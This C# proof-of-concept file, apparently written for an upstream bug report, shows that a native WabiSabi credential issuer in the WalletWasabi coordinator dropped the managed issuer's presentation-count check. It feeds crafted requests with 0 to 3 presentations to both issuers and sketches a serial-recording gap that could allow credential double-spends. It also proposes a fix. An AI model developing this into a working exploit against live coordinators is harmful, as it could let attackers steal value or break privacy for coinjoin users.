/*
 * PoC: dropped presentation-count guard in WabiSabi.Native.CredentialIssuer (WabiSabi 1.2.0 at
 * f8e1d4d, 1.3.0 on current master), wired into the WalletWasabi coordinator (Round.cs:
 * `using CredentialIssuer = WabiSabi.Native.CredentialIssuer`).
 *
 * The audited managed issuer (WabiSabi.Crypto.CredentialIssuer, lines 127-134) rejects any
 * non-null request that does not present exactly ProtocolConstants.CredentialNumber (2)
 * credentials. The native issuer that replaced it enforces no such check, and the C library
 * reads a FIXED 2 presentations from fixed byte offsets (c/src/ffi.c:548, issuer.c:141).
 *
 * This is a defensive artifact for an upstream bug report. It proves the regression and
 * then states, honestly, exactly how far it does and does not reach toward an exploit.
 */

using System;
using System.Linq;
using System.Reflection;
using System.Threading;
using WabiSabi;
using WabiSabi.Crypto;
using WabiSabi.Crypto.Groups;
using WabiSabi.Crypto.Randomness;
using WabiSabi.Crypto.ZeroKnowledge;
using WabiSabi.CredentialRequesting;

using CsIssuer     = WabiSabi.Crypto.CredentialIssuer;
using NativeIssuer = WabiSabi.Native.CredentialIssuer;

class Poc
{
    const long MaxAmount = 1_000_000L;
    static WasabiRandom Rng => SecureRandom.Instance;

    static (bool ok, string err) Run(Func<CredentialsResponse> f)
    {
        try { f(); return (true, ""); }
        catch (Exception ex) { return (false, $"{ex.GetType().Name.Replace("WabiSabiCryptoException","reject")}: {ex.Message.Split('\n')[0]}"); }
    }

    static int RecordedSerials(NativeIssuer ni)
    {
        var fld = typeof(NativeIssuer).GetField("_serialNumbers", BindingFlags.NonPublic | BindingFlags.Instance);
        return ((System.Collections.IEnumerable)fld.GetValue(ni)).Cast<object>().Count();
    }

    static void Main()
    {
        Console.WriteLine("WabiSabi native issuer -- dropped presentation-count guard\n");

        var sk = new CredentialIssuerSecretKey(Rng);
        var iparams = sk.ComputeCredentialIssuerParameters();
        var client = new WabiSabiClient(iparams, Rng, MaxAmount);

        var zd = client.CreateRequestForZeroAmount();
        var boot = new CsIssuer(sk, Rng, MaxAmount);
        var zeroCreds = client.HandleResponse(boot.HandleRequest(zd.CredentialsRequest), zd.CredentialsResponseValidation).ToArray();
        var realData = client.CreateRequest(new long[] { 400_000, 300_000 }, zeroCreds, CancellationToken.None);
        var real = (RealCredentialsRequest)realData.CredentialsRequest;
        var pres = real.Presented.ToArray();

        // ===== CLAIM 1: the count guard was dropped (PROVEN) ===================
        Console.WriteLine("CLAIM 1 [PROVEN]: managed enforces 'exactly 2 presentations'; native does not.\n");
        foreach (var n in new[] { 0, 1, 2, 3 })
        {
            var p = n <= pres.Length ? pres.Take(n).ToArray()
                                     : pres.Concat(Enumerable.Repeat(pres[0], n - pres.Length)).ToArray();
            var req = new RealCredentialsRequest(real.Delta, p, real.Requested, real.Proofs);
            var (cOk, cErr) = Run(() => new CsIssuer(sk, Rng, MaxAmount).HandleRequest(req));
            var (nOk, nErr) = Run(() => new NativeIssuer(sk, Rng, MaxAmount).HandleRequest(req));
            Console.WriteLine($"  Presented.Count={n,-2} managed: {(cOk?"ACCEPT":"reject"),-6} {cErr}");
            Console.WriteLine($"  {"",21}native : {(nOk?"ACCEPT":"reject"),-6} {nErr}");
        }
        Console.WriteLine("  Observe: for count in {0,1,3} managed rejects with the COUNT guard.");
        Console.WriteLine("  Native never mentions a count -- it reaches the C parser/verifier instead,");
        Console.WriteLine("  i.e. it has no equivalent of managed CredentialIssuer.cs:127-134.");

        // ===== CLAIM 2: C reads a FIXED 2 presentations (CODE, corroborated) ===
        Console.WriteLine("\nCLAIM 2 [CODE-PROVEN]: the C library reads exactly 2 presentations from fixed");
        Console.WriteLine("  offsets regardless of how many were declared, and builds 2 show-statements:");
        Console.WriteLine("    c/src/ffi.c:548   for (i=0; i<WABISABI_CREDENTIAL_COUNT; i++) read_presentation(...)");
        Console.WriteLine("    c/src/issuer.c:141 for (i=0; i<WABISABI_CREDENTIAL_COUNT; i++) show_credential_statement");
        Console.WriteLine("  Corroboration: with Presented.Count=1 the native issuer rejects inside the C");
        Console.WriteLine("  parser/verifier on presented[1] (the exact code is printed for count=1 above; it is");
        Console.WriteLine("  a parse or invalid-proof rejection depending on the bytes, never a count check),");
        Console.WriteLine("  proving it read a 2nd presentation from bytes the declared request did not intend as");
        Console.WriteLine("  one. The managed issuer rejected the same input on the count.");

        // ===== CLAIM 3: the wrapper records serials only for declared presentations =
        Console.WriteLine("\nCLAIM 3 [CODE-PROVEN mechanism]: double-spend prevention is the wrapper's job");
        Console.WriteLine("  (Native/CredentialIssuer.cs:89-101) and it records serials for the DECLARED");
        Console.WriteLine("  presentations only; the C library tracks none. Serial S = Randomness*Gs is fixed");
        Console.WriteLine("  per credential (Credential.cs:53), so an unburned serial stays re-presentable.");
        var niOk = new NativeIssuer(sk, Rng, MaxAmount);
        Run(() => niOk.HandleRequest(real));                       // a valid 2-presentation request
        Console.WriteLine($"    valid Presented.Count=2 request -> serials recorded = {RecordedSerials(niOk)} (expected 2)");
        Console.WriteLine("    the wrapper records one serial per DECLARED presentation, while the C verifier");
        Console.WriteLine("    processes a fixed 2 -- so the recorded count can be fewer than the count verified.");

        Console.WriteLine("\nFix: restore the count guards in the native wrapper (mirror managed 118-134);");
        Console.WriteLine("reject off!=req_len in the FFI; validate Presented.Count in Arena.");
    }
}
